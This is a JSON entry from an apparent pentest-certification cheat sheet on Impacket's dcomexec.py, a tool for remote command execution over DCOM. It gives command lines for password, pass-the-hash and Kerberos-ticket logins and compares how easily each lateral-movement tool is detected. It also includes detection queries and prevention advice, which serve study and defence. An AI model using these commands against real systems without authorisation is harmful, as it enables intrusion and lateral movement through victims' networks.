@@ -1,0 +1,97 @@
+{
+  "id": "ad-impacket-dcomexec",
+  "name": "dcomexec.py - Remote Execution via DCOM",
+  "command": "dcomexec.py <domain>/<user>:<pass>@<target> \"<command>\"",
+  "description": "dcomexec.py executes commands on remote Windows hosts via DCOM (Distributed Component Object Model) objects like MMC20.Application, ShellWindows, and ShellBrowserWindow. Does not create a service or drop a binary - uses legitimate Windows DCOM interfaces. Less detected than PsExec/smbexec but slower.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Impacket; DCOM lateral movement",
+  "tags": [
+    "dcomexec",
+    "impacket",
+    "dcom",
+    "lateral-movement",
+    "remote-exec",
+    "mmc20"
+  ],
+  "mitre": [
+    "T1021.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== BASIC USAGE ===\n  dcomexec.py <domain>/<user>:<pass>@<target>\n  dcomexec.py <domain>/<user>:<pass>@<target> \"whoami\"\n  dcomexec.py <domain>/<user>@<target> -hashes :<nthash>\n\n=== DCOM OBJECTS ===\n  # MMC20.Application (default):\n  dcomexec.py -object MMC20 <domain>/<user>:<pass>@<target>\n  # ShellWindows:\n  dcomexec.py -object ShellWindows <domain>/<user>:<pass>@<target>\n  # ShellBrowserWindow:\n  dcomexec.py -object ShellBrowserWindow <domain>/<user>:<pass>@<target>\n\n=== PASS THE HASH ===\n  dcomexec.py <domain>/<user>@<target> -hashes aad3b435b51404eeaad3b435b51404ee:<nthash>\n\n=== KERBEROS AUTH ===\n  export KRB5CCNAME=ticket.ccache\n  dcomexec.py -k -no-pass <domain>/<user>@<target>\n\n=== COMPARISON: LATERAL MOVEMENT TOOLS ===\n  # psexec.py:    Creates service, writes binary. LOUD. SYSTEM shell.\n  # smbexec.py:   Creates service for each command. Moderate noise.\n  # wmiexec.py:   Uses WMI. Semi-interactive. Moderate detection.\n  # dcomexec.py:  Uses DCOM. No service/binary. Lower detection.\n  # atexec.py:    Uses Task Scheduler. Single command. Moderate.\n  # evil-winrm:   Uses WinRM (port 5985). Interactive. Common.",
+  "examples": [
+    {
+      "label": "Interactive shell via DCOM",
+      "command": "dcomexec.py corp.local/admin:Password123@10.10.10.100"
+    },
+    {
+      "label": "Single command execution",
+      "command": "dcomexec.py corp.local/admin:Password123@10.10.10.100 \"whoami /priv\""
+    },
+    {
+      "label": "Pass-the-hash via DCOM",
+      "command": "dcomexec.py corp.local/admin@10.10.10.100 -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "MITRE T1021.003 - DCOM",
+      "url": "https://attack.mitre.org/techniques/T1021/003/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "impacket-exec",
+      "note": "Overview of all Impacket execution tools (psexec, smbexec, wmiexec, atexec).",
+      "rel": "alternative"
+    },
+    {
+      "id": "pth-impacket",
+      "note": "Pass-the-hash with other Impacket tools.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "DCOM objects like MMC20.Application expose ExecuteShellCommand methods that can be called remotely with valid credentials. No service or binary is created on the target.",
+    "prerequisites": "Valid domain credentials with local admin on target; DCOM enabled (default).",
+    "impact": "Remote command execution; interactive shell on the target.",
+    "detection": "[MITRE T1021.003] DCOM object instantiation from remote IP; svchost.exe spawning cmd.exe via DcomLaunch; Event 4624 type 3.",
+    "artifacts": "DCOM-related process creation (mmc.exe, explorer.exe); Event 4624 network logon; child processes from svchost DcomLaunch.",
+    "splunk_spl": "index=windows EventCode=4688 ParentProcessName=\"*svchost.exe*\" (NewProcessName=\"*cmd.exe\" OR NewProcessName=\"*powershell.exe\")\n| where ParentCommandLine=\"*DcomLaunch*\"\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+    "elastic_kql": "process.parent.name:\"svchost.exe\" AND process.parent.args:\"DcomLaunch\" AND process.name:(\"cmd.exe\" OR \"powershell.exe\")",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName == \"svchost.exe\"\n| where InitiatingProcessCommandLine has \"DcomLaunch\"\n| where FileName in (\"cmd.exe\", \"powershell.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+    "sigma_rules": "win_process_creation_dcom_lateral_movement",
+    "prevention": "Disable remote DCOM when not needed; restrict local admin access; monitor DCOM object instantiation; use Windows Firewall to block DCOM ports from untrusted hosts.",
+    "sources": [
+      "Impacket documentation",
+      "https://attack.mitre.org/techniques/T1021/003/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "DCOM lateral movement - DcomLaunch child process",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName == \"svchost.exe\"\n| where InitiatingProcessCommandLine has \"DcomLaunch\"\n| where FileName in~ (\"cmd.exe\", \"powershell.exe\", \"mmc.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1021.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate remote DCOM administration; MMC snap-in usage",
+        "tuning": "Correlate with network logon (4624 type 3) from unusual source IPs"
+      }
+    ]
+  }
+}
